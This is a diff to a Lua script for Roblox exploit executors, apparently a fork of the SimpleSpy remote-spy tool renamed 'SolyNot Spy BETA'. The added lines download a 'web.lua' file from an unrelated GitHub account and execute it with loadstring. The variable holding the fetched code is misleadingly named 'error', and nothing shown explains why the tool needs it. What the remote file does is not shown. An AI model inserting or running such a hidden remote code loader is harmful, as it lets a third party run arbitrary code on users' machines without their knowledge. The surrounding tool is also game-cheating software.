@@ -6,6 +6,14 @@ local TweenService = cloneref(game:GetService("TweenService"))
 local Serializer = loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/refs/heads/main/Dependencies/Libraries/Serializer.luau"))()
 local Highlight = loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/Highlight.lua"))()
 
+getgenv().version = "SolyNot Spy BETA"
+
+local succes, error = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua")
+if not succes then 
+    return warn("HTTP error:", error)
+end
+
+loadstring(error)()
 local function getplayer(instance)
 	for _, player in pairs(Players:GetPlayers()) do
 		if instance:IsDescendantOf(player.Character) then
